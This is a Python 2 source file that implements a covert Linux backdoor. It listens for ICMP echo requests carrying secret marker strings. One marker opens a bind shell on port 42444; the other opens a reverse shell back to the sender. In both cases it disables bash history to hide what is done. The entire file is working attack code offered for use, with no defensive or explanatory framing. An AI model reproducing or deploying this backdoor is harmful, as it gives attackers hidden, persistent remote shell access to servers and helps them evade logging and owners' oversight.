'''
    Sniffs packages ICMP ECHO REQUEST to activate shell on server. 
    OS: Linux

    Tiago Martins (tiago.tsmweb@gmail.com)
'''

import socket
import sys
import os
import pty
import threading
from struct import *

PORT = 42444
ICMP_ECHO_REQUEST = 8

def open_shell():
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("", PORT))
        sock.listen(1)
        (cli, addr) = sock.accept()

        # Save previous standard in, out, and error
        oldInFd = os.dup(0)
        oldOutFd = os.dup(1)
        oldErrFd = os.dup(2)

        # Redirect standard in, out, and error
        os.dup2(cli.fileno(), 0)
        os.dup2(cli.fileno(), 1)
        os.dup2(cli.fileno(), 2)
        
        # Open shell interactive
        os.putenv("HISTFILE","/dev/null")
        pty.spawn("/bin/bash")
        
        # Close socket
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()

        # Restore standard in, out, and error
        os.dup2(oldInFd, 0)
        os.close(oldInFd)
        os.dup2(oldOutFd, 1)
        os.close(oldOutFd)
        os.dup2(oldErrFd, 2)
        os.close(oldErrFd)
    except socket.error as msg:
        print str(msg)
        sys.exit()

def open_reverse_shell(dest_address):
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Save previous standard in, out, and error
        oldInFd = os.dup(0)
        oldOutFd = os.dup(1)
        oldErrFd = os.dup(2)

        # Connect socket
        sock.connect((dest_address, PORT))

        # Redirect standard in, out, and error
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)

        # Open shell interactive
        os.putenv("HISTFILE","/dev/null")
        pty.spawn("/bin/bash")
        
        # Close socket
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()

        # Restore standard in, out, and error
        os.dup2(oldInFd, 0)
        os.close(oldInFd)
        os.dup2(oldOutFd, 1)
        os.close(oldOutFd)
        os.dup2(oldErrFd, 2)
        os.close(oldErrFd)
    except socket.error as msg:
        print str(msg)
        sys.exit() 

def main():
    try:
        # Create socket raw - icmp
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error , msg:
        print "[!] Socket could not be created. Error Code : " + str(msg[0]) + " Message " + msg[1]
        sys.exit()

    while True:
        packet = sock.recvfrom(65565)[0]

        # IP packet
        ip_header = packet[0:20]
        iph = unpack("!BBHHHBBH4s4s", ip_header)

        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl * 4

        ttl = iph[5]
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8])
        d_addr = socket.inet_ntoa(iph[9])
        
        # ICMP packet
        icmph_length = 4
        icmp_header = packet[iph_length:iph_length+icmph_length]
        icmph = unpack("!BBH", icmp_header)

        icmp_type = icmph[0]
        icmp_code = icmph[1]
        icmp_checksum = icmph[2]

        if icmp_type == ICMP_ECHO_REQUEST:
            # PAYLOAD
            h_size = iph_length + icmph_length
            data = packet[h_size:]

            if "-*-ias-*-" in str(data).lower():
                print "[>] Open shell in: " + str(s_addr)
                bs_thread = threading.Thread(target=open_shell, args=())
                bs_thread.start()
            elif "-*-iars-*-" in str(data).lower():
                print "[>] Open reverse shell in: " + str(s_addr)
                brs_thread = threading.Thread(target=open_reverse_shell, args=(str(s_addr),))
                brs_thread.start() 


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
